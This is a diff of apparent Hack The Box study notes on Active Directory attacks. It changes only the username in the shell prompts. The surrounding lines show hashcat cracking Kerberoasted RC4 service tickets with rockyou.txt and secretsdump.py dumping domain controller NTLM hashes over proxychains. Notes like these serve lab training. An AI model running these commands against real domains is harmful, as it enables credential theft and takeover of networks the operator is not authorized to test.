@@ -344,7 +344,7 @@ Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attri
 ### RC4 (type 23) encrypted ticket ($krb5tgs$23$)
 #### Cracking the Ticket with Hashcat & rockyou.txt
 ```
-d0x777@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
+w1j0y@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
 ```
 If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.
 ### AES 128/256 encryption tickets ($krb5tgs$17$) or ($krb5tgs$18$)
@@ -483,7 +483,7 @@ PowerView can be used to confirm that this standard user does indeed have the ne
 secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
 ```
 ```
-d0x777@htb[/htb]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
+w1j0y@htb[/htb]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
 ```
 **ip for the DC**
 ## Viewing an Account with Reversible Encryption Password Storage Set
